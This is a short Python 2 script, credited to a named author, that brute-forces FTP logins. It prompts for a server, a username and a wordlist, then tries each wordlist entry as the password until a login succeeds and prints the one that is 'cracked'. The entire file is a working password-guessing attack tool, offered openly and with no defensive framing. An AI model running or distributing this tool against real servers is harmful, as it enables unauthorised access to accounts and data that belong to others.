#!/usr/bin/env python
import ftplib
# Designed By Scott Hermann @ Youtube.com/user/postulatedstate ScottHermann850@gmail.com
# ftp bruteforcer
server=raw_input("FTP Server: ");
user=raw_input("Server username: ");
wordlist=raw_input("Path/To/Wordlist#:-$\> ");
try:
 with open(wordlist, 'r') as pw:
  for word in pw:
   word = word.strip('\r').strip('\n')
   try:
    ftp = ftplib.FTP(server)
    ftp.login(user,word)
    print(word + ' cracked...')
    break
   except:
    print('still brute forcing...')
except:
 print('Wordlist error')



